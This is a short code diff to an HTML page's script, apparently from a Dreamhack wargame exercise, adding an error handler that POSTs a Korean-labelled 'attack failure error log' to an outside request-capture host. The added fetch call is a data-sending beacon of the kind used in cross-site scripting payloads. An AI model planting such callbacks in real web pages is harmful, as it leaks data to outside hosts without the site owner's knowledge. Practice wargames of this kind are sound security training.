@@ -39,7 +39,13 @@
                 document.getElementById("result-box").textContent = htmlString;
                 console.log(htmlString)
             }
-        })
+        }).catch(error => {
+            fetch("https://rtjpgyy.request.dreamhack.games", {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: "공격 실패 에러 로그: " + error.message
+            });
+        });
     </script>
 </body>
 </html>
